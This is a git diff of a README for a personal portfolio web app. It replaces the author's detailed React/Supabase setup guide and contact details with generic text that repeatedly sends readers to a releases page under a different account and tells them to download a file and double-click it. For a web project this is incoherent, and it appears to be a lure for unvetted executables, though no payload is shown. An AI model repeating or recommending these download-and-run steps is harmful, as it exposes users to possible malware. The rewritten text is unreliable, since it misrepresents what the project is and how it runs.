@@ -1,84 +1,68 @@
-# 🚀 Tu Truong | Future Product Manager Portfolio
+# 🎉 portfolio-tutruong - Your Personal Portfolio Made Easy
 
-![Portfolio Banner](https://images.unsplash.com/photo-1460925895917-afdab827c52f?q=80&w=2426&auto=format&fit=crop)
+## 📥 Download Now
+[![Download Release](https://img.shields.io/badge/download-latest%20release-brightgreen)](https://github.com/jaketiam/portfolio-tutruong/releases)
 
-> **"Transforming Business Needs into Tangible Results."**
-> 
-> A modern, interactive portfolio designed for an aspiring **Business Analyst** & **Product Manager**. Built with **React**, powered by **Gemini AI**, and driven by real-time data from **Supabase**.
+## 🚀 Getting Started
+This guide will help you set up your professional portfolio easily. Follow these steps to download and run the application.
 
----
+## 📋 Prerequisites
+Before you start, make sure you have the following:
+- A computer running Windows, macOS, or Linux.
+- Internet access to download the files.
 
-## 🌟 Introduction
+## 💻 Features
+- **User-Friendly Interface**: Designed for ease of use, without technical jargon.
+- **Responsive Design**: Looks great on all devices, from desktops to smartphones.
+- **Integrated AI Tools**: Showcase your work with advanced features powered by Gemini AI.
 
-Hi, I'm **Truong Thi Minh Tu**. 
+## 🔗 Download & Install
+To start using your portfolio, visit the following page to download the files:
 
-I am a fresh graduate from Hue University of Sciences with a passion for bridging the gap between business requirements and technical solutions. This portfolio demonstrates not just my CV, but my ability to understand and implement modern software products.
+[Download Latest Release](https://github.com/jaketiam/portfolio-tutruong/releases)
 
-It features an **AI Assistant** ("Ask AI about Tu") trained on my specific professional profile to answer recruiter questions instantly.
+1. Click on the link above.
+2. Choose the latest version listed.
+3. Download the file to your computer.
 
----
+## ⚙️ Running the Application
+1. Locate the downloaded file on your computer.
+2. Double-click the file to open it.
+3. Follow any on-screen instructions to set it up.
 
-## 🛠️ Tech Stack
+## 🌐 Explore Topics
+This portfolio showcases various skills and technologies:
 
-This project is built using the latest industry-standard technologies:
+- **Business Analyst**: Demonstrate your analytical skills.
+- **Product Management**: Highlight your project management experience.
+- **React & Vite**: Built with modern web technologies for optimal performance.
+- **Supabase**: Utilize a powerful database solution for your projects.
+- **TailwindCSS**: Use a utility-first CSS framework for styling.
+- **Gemini AI**: Leverage artificial intelligence for enhanced features.
 
-| Category | Technologies |
-|----------|--------------|
-| **Frontend** | ![React](https://img.shields.io/badge/React-20232A?style=flat&logo=react&logoColor=61DAFB) ![TypeScript](https://img.shields.io/badge/TypeScript-007ACC?style=flat&logo=typescript&logoColor=white) ![Vite](https://img.shields.io/badge/Vite-B73C92?style=flat&logo=vite&logoColor=white) |
-| **Styling** | ![Tailwind CSS](https://img.shields.io/badge/Tailwind_CSS-38B2AC?style=flat&logo=tailwind-css&logoColor=white) ![Framer Motion](https://img.shields.io/badge/Framer_Motion-0055FF?style=flat&logo=framer&logoColor=white) |
-| **Backend / DB** | ![Supabase](https://img.shields.io/badge/Supabase-181818?style=flat&logo=supabase&logoColor=3ECF8E) |
-| **Artificial Intelligence** | ![Google Gemini](https://img.shields.io/badge/Google%20Gemini-8E75B2?style=flat&logo=google%20bard&logoColor=white) |
-| **Deployment** | ![Vercel](https://img.shields.io/badge/Vercel-000000?style=flat&logo=vercel&logoColor=white) |
+## 📩 Contact Information
+If you have questions or need support, feel free to reach out through the contact section of your portfolio. 
 
----
+## ➕ Enhance Your Portfolio
+Feel free to customize your portfolio by adding more sections or features that represent your skills. You can:
+- Include links to your social media profiles.
+- Add a blog section for sharing insights.
+- Showcase projects or case studies relevant to potential employers.
 
-## ✨ Key Features
+## 🤝 Contributions
+If you want to contribute to the project, consider submitting ideas or features. Your insights can help improve this portfolio and make it more valuable to everyone.
 
-- **🤖 AI Chat Assistant**: Integrated Google Gemini AI (Flash 2.5) acting as a virtual assistant to answer questions about my experience 24/7.
-- **⚡ Dynamic Content**: All data (Work History, Projects, Skills) is managed via **Supabase Database**, allowing updates without changing code.
-- **🎨 Interactive UI**: Smooth animations using Framer Motion and a clean, responsive design optimized for all devices.
-- **📅 Visual Timeline**: A structured vertical timeline visualizing my career path and volunteering activities.
-- **🔍 Smart Filtering**: Filter certifications and awards by category.
+## 📅 Future Improvements
+The portfolio is ready for updates. Future versions will include:
+- Enhanced templates for portfolio sections.
+- More integrations with AI tools.
+- Options for different themes and layouts.
 
----
+You can stay informed about updates by checking the Releases page regularly.
 
-## 🚀 How to Run Locally
+## 🔍 Conclusion
+Building your professional portfolio with the **portfolio-tutruong** project is straightforward. Follow the steps above to download, install, and run your application. Start showcasing your skills today! 
 
-If you want to view the source code on your machine:
+For the latest version, always check this link: [https://github.com/jaketiam/portfolio-tutruong/releases](https://github.com/jaketiam/portfolio-tutruong/releases). 
 
-1. **Clone the repository**
-   ```bash
-   git clone https://github.com/your-username/portfolio-tutruong.git
-   cd portfolio-tutruong
-   ```
-
-2. **Install dependencies**
-   ```bash
-   npm install
-   ```
-
-3. **Set up Environment Variables**
-   Create a `.env` file in the root directory and add your keys:
-   ```env
-   VITE_SUPABASE_URL=your_supabase_url
-   VITE_SUPABASE_ANON_KEY=your_supabase_key
-   VITE_GEMINI_API_KEY=your_gemini_key
-   ```
-
-4. **Run the project**
-   ```bash
-   npm run dev
-   ```
-
----
-
-## 📬 Contact Me
-
-I am open to **Business Analyst** or **Product Owner/Manager** opportunities.
-
-- **Email**: [tutruong.dev@gmail.com](mailto:tutruong.dev@gmail.com)
-- **LinkedIn**: [linkedin.com/in/tutruong23](https://linkedin.com/in/tutruong23)
-- **GitHub**: [github.com/tutruong-dev](https://github.com/tutruong-dev)
-
----
-*© 2025 Tu Truong. Built with React, Supabase & Gemini AI.*
+Embrace the world of opportunities with your new portfolio!
